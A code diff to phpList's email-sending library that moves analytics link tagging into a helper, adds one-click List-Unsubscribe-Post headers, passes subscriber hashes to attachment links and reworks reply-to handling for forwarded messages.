@@ -4,6 +4,7 @@ require_once dirname(__FILE__).'/accesscheck.php';
 
 // send an email library
 include_once dirname(__FILE__).'/class.phplistmailer.php';
+require_once __DIR__ . '/analytics.php';
 
 if (!function_exists('output')) {
     function output($text)
@@ -121,7 +122,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
         }
 
         //# Fetch external content, only if the URL has placeholders
-        if ($GLOBALS['can_fetchUrl'] && preg_match("/\[URL:([^\s]+)\]/i", $content, $regs)) {
+        if (preg_match("/\[URL:([^\s]+)\]/i", $content, $regs)) {
             while (isset($regs[1]) && strlen($regs[1])) {
                 $url = $regs[1];
                 if (!preg_match('/^http/i', $url)) {
@@ -598,37 +599,25 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
     //# if we're not tracking clicks, we should add Google tracking here
     //# otherwise, we can add it when redirecting on the click
     if (!CLICKTRACK && !empty($cached[$messageid]['google_track'])) {
+        /*
+         * process html format email
+         */
+        $analytics = getAnalyticsQuery();
+        $trackingParameters = $analytics->trackingParameters('HTML', loadMessageData($messageid));
+        $prefix = $analytics->prefix();
         preg_match_all('/<a (.*)href=(["\'])(.*)\2([^>]*)>(.*)<\/a>/Umis', $htmlmessage, $links);
+
         for ($i = 0; $i < count($links[3]); ++$i) {
             $link = cleanUrl($links[3][$i]);
             $link = str_replace('"', '', $link);
-            //# http://www.google.com/support/analytics/bin/answer.py?hl=en&answer=55578
-
-            $trackingcode = 'utm_source=phplist'.$messageid.'&utm_medium=email&utm_content=HTML&utm_campaign='.urlencode($cached[$messageid]['subject']);
-            //# take off existing tracking code, if found
-            if (strpos($link, 'utm_medium') !== false) {
-                $link = preg_replace('/utm_(\w+)\=[^&]+&/U', '', $link);
-            }
-            //# 16894 make sure to keep the fragment value at the end of the URL
-            if (strpos($link, '#')) {
-                list($tmplink, $fragment) = explode('#', $link);
-                $link = $tmplink;
-                unset($tmplink);
-                $fragment = '#'.$fragment;
-            } else {
-                $fragment = '';
-            }
-
-            if (strpos($link, '?')) {
-                $newurl = $link.'&'.$trackingcode.$fragment;
-            } else {
-                $newurl = $link.'?'.$trackingcode.$fragment;
-            }
-            //   print $link. ' '.$newurl.' <br/>';
+            $newurl = addAnalyticsTracking($link, $trackingParameters, $prefix);
             $newlink = sprintf('<a %shref="%s" %s>%s</a>', $links[1][$i], $newurl, $links[4][$i], $links[5][$i]);
             $htmlmessage = str_replace($links[0][$i], $newlink, $htmlmessage);
         }
-
+        /*
+         * process plain-text format email
+         */
+        $trackingParameters = $analytics->trackingParameters('text', loadMessageData($messageid));
         preg_match_all('#(https?://[^\s\>\}\,]+)#mis', $textmessage, $links);
         rsort($links[1]);
         $newlinks = array();
@@ -641,28 +630,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
 
             if (preg_match('/^http|ftp/i', $link)) {
                 // && !strpos($link,$clicktrack_root)) {
-                $url = cleanUrl($link, array('PHPSESSID', 'uid'));
-                //@alpha1: maybe source should be message id?
-                $trackingcode = 'utm_source=phplist'.$messageid.'&utm_medium=email&utm_content=text&utm_campaign='.urlencode($cached[$messageid]['subject']);
-                //# take off existing tracking code, if found
-                if (strpos($link, 'utm_medium') !== false) {
-                    $link = preg_replace('/utm_(\w+)\=[^&]+/', '', $link);
-                }
-                //# 16894 make sure to keep the fragment value at the end of the URL
-                if (strpos($link, '#')) {
-                    list($tmplink, $fragment) = explode('#', $link);
-                    $link = $tmplink;
-                    unset($tmplink);
-                    $fragment = '#'.$fragment;
-                } else {
-                    $fragment = '';
-                }
-                if (strpos($link, '?')) {
-                    $newurl = $link.'&'.$trackingcode.$fragment;
-                } else {
-                    $newurl = $link.'?'.$trackingcode.$fragment;
-                }
-
+                $newurl = addAnalyticsTracking($link, $trackingParameters, $prefix);
                 $newlinks[$i] = $newurl;
                 $textmessage = str_replace($links[1][$i], '[%%%'.$i.'%%%]', $textmessage);
             }
@@ -750,10 +718,11 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
     if ($forwardedby) {
         $mail->add_timestamp();
     }
-    $mail->addCustomHeader('List-Help: <'.$text['preferences'].'>');
-    $mail->addCustomHeader('List-Unsubscribe: <'.$text['jumpoffurl'].'>');
-    $mail->addCustomHeader('List-Subscribe: <'.getConfig('subscribeurl').'>');
-    $mail->addCustomHeader('List-Owner: <mailto:'.getConfig('admin_address').'>');
+    $mail->addCustomHeader('List-Help', '<'.$text['preferences'].'>');
+    $mail->addCustomHeader('List-Unsubscribe', '<'.$text['jumpoffurl'].'>');
+    $mail->addCustomHeader('List-Unsubscribe-Post', 'List-Unsubscribe=One-Click');
+    $mail->addCustomHeader('List-Subscribe', '<'.getConfig('subscribeurl').'>');
+    $mail->addCustomHeader('List-Owner', '<mailto:'.getConfig('admin_address').'>');
 
     list($dummy, $domaincheck) = explode('@', $destinationemail);
     $text_domains = explode("\n", trim(getConfig('alwayssendtextto')));
@@ -806,7 +775,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                             'application/pdf');
                     }
                 }
-                if (!addAttachments($messageid, $mail, 'HTML')) {
+                if (!addAttachments($messageid, $mail, 'HTML',$hash)) {
                     return 0;
                 }
             } else {
@@ -814,7 +783,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                     Sql_Query("update {$GLOBALS['tables']['message']} set astext = astext + 1 where id = $messageid");
                 }
                 $mail->add_text($textmessage);
-                if (!addAttachments($messageid, $mail, 'text')) {
+                if (!addAttachments($messageid, $mail, 'text',$hash)) {
                     return 0;
                 }
             }
@@ -848,7 +817,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                             'application/pdf');
                     }
                 }
-                if (!addAttachments($messageid, $mail, 'HTML')) {
+                if (!addAttachments($messageid, $mail, 'HTML',$hash)) {
                     return 0;
                 }
             } else {
@@ -856,7 +825,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                     Sql_Query("update {$GLOBALS['tables']['message']} set astext = astext + 1 where id = $messageid");
                 }
                 $mail->add_text($textmessage);
-                if (!addAttachments($messageid, $mail, 'text')) {
+                if (!addAttachments($messageid, $mail, 'text',$hash)) {
                     return 0;
                 }
             }
@@ -867,7 +836,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                 Sql_Query("update {$GLOBALS['tables']['message']} set astext = astext + 1 where id = $messageid");
             }
             $mail->add_text($textmessage);
-            if (!addAttachments($messageid, $mail, 'text')) {
+            if (!addAttachments($messageid, $mail, 'text',$hash)) {
                 return 0;
             }
             break;
@@ -900,7 +869,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                         $htmlmessage = wordwrap($htmlmessage, WORDWRAP_HTML, "\r\n");
                     }
                     $mail->add_html($htmlmessage, $textmessage, $cached[$messageid]['templateid']);
-                    if (!addAttachments($messageid, $mail, 'HTML')) {
+                    if (!addAttachments($messageid, $mail, 'HTML',$hash)) {
                         return 0;
                     }
                 } else {
@@ -910,7 +879,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
                     $mail->add_text($textmessage);
 //          $mail->setText($textmessage);
 //          $mail->Encoding = TEXTEMAIL_ENCODING;
-                    if (!addAttachments($messageid, $mail, 'text')) {
+                    if (!addAttachments($messageid, $mail, 'text',$hash)) {
                         return 0;
                     }
                 }
@@ -920,19 +889,21 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
 //  print htmlspecialchars($htmlmessage);exit;
 
     if (!TEST) {
+        $fromemail = $cached[$messageid]['fromemail'];
+
         if ($hash != 'forwarded' || !count($forwardedby)) {
             $fromname = $cached[$messageid]['fromname'];
-            $fromemail = $cached[$messageid]['fromemail'];
             $subject = $cached[$messageid]['subject'];
+
+            if (!empty($cached[$messageid]['replytoemail'])) {
+                $mail->AddReplyTo($cached[$messageid]['replytoemail'], $cached[$messageid]['replytoname']);
+            }
         } else {
-            $fromname = '';
-            $fromemail = $forwardedby['email'];
+            $fromname = $forwardedby['subscriberName'];
             $subject = $GLOBALS['strFwd'].': '.$cached[$messageid]['subject'];
+            $mail->AddReplyTo($forwardedby['email'], $forwardedby['subscriberName']);
         }
 
-        if (!empty($cached[$messageid]['replytoemail'])) {
-            $mail->AddReplyTo($cached[$messageid]['replytoemail'], $cached[$messageid]['replytoname']);
-        }
         if ($getspeedstats) {
             output('build End '.$GLOBALS['processqueue_timer']->interval(1));
         }
@@ -1001,7 +972,7 @@ function sendEmail($messageid, $email, $hash, $htmlpref = 0, $rssitems = array()
     return 0;
 }
 
-function addAttachments($msgid, &$mail, $type)
+function addAttachments($msgid, &$mail, $type,$hash = '')
 {
     global $attachment_repository, $website;
     $hasError = false;
@@ -1092,6 +1063,9 @@ function addAttachments($msgid, &$mail, $type)
 
                     case 'text':
                         $viewurl = $GLOBALS['public_scheme'].'://'.$website.$GLOBALS['pageroot'].'/dl.php?id='.$att['id'];
+                        if (!empty($hash)) {
+                            $viewurl .= '&uid='.$hash;
+                        }
                         $mail->append_text($att['description']."\n".$GLOBALS['strLocation'].': '.$viewurl."\n");
                         break;
                 }
@@ -1419,7 +1393,7 @@ function precacheMessage($messageid, $forwardContent = 0)
     $message = loadMessageData($messageid);
     $cached[$messageid]['uuid'] = $message['uuid'];
 
-    //# the reply to is actually not in use
+    // parse the reply-to field into its components - email and name
     if (preg_match('/([^ ]+@[^ ]+)/', $message['replyto'], $regs)) {
         // if there is an email in the from, rewrite it as "name <email>"
         $message['replyto'] = str_replace($regs[0], '', $message['replyto']);
@@ -1496,7 +1470,7 @@ function precacheMessage($messageid, $forwardContent = 0)
 
     if (!$cached[$messageid]['userspecific_url']) {
         //# Fetch external content here, because URL does not contain placeholders
-        if ($GLOBALS['can_fetchUrl'] && preg_match("/\[URL:([^\s]+)\]/i", $cached[$messageid]['content'], $regs)) {
+        if (preg_match("/\[URL:([^\s]+)\]/i", $cached[$messageid]['content'], $regs)) {
             $remote_content = fetchUrl($regs[1], array());
             //  $remote_content = fetchUrl($message['sendurl'],array());
 
@@ -1565,16 +1539,15 @@ function precacheMessage($messageid, $forwardContent = 0)
         output('parse config end');
     }
 
-    //# ##17233 not that many fields are actually useful, so don't blatantly use all
-//  foreach($message as $key => $val) {
     foreach (array('subject', 'id', 'fromname', 'fromemail') as $key) {
         $val = $message[$key];
-        if (!is_array($val)) {
+        // Replace in content except for user-specific URL
+        if (!$cached[$messageid]['userspecific_url']) {
             $cached[$messageid]['content'] = str_ireplace("[$key]", $val, $cached[$messageid]['content']);
-            $cached[$messageid]['textcontent'] = str_ireplace("[$key]", $val, $cached[$messageid]['textcontent']);
-            $cached[$messageid]['textfooter'] = str_ireplace("[$key]", $val, $cached[$messageid]['textfooter']);
-            $cached[$messageid]['htmlfooter'] = str_ireplace("[$key]", $val, $cached[$messageid]['htmlfooter']);
         }
+        $cached[$messageid]['textcontent'] = str_ireplace("[$key]", $val, $cached[$messageid]['textcontent']);
+        $cached[$messageid]['textfooter'] = str_ireplace("[$key]", $val, $cached[$messageid]['textfooter']);
+        $cached[$messageid]['htmlfooter'] = str_ireplace("[$key]", $val, $cached[$messageid]['htmlfooter']);
     }
     /*
      *  cache message owner and list owner attribute values
